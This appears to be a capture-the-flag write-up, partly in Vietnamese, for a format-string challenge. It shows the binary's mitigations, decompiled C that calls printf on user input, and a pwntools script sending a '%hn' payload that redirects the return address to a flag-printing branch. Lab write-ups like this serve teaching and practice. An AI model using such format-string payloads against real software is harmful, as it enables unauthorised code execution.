# FormatString4

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## source code

```c
int exploit()
{
  char s1[16]; // [rsp+10h] [rbp-70h] BYREF
  char buf[88]; // [rsp+20h] [rbp-60h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("I will give you one chance to get flag");
  read(0, buf, 80uLL);
  if ( !strcmp(s1, "flag") )
    system("/bin/cat /home/fmt4/flag.txt");
  return printf(buf);
}
```

## Vulnerability

Trong hàm exploit có 1 lỗi format string. Nếu như chỉ để lấy flag ta có thể sửa return address của hàm về địa chỉ của nhánh gọi `system("/bin/cat /home/fmt4/flag.txt");`. Tuy chương trình có sử dụng `PIE enabled` nhưng 2 địa chỉ này khác gần nên chỉ cần sửa 1 byte cuối.

### script

```python
p = start()
p.sendlineafter(b'name: ',b'quangba')

payload = b'%2955c%7$hn'
p.sendafter(b'flag', payload)

p.interactive()
```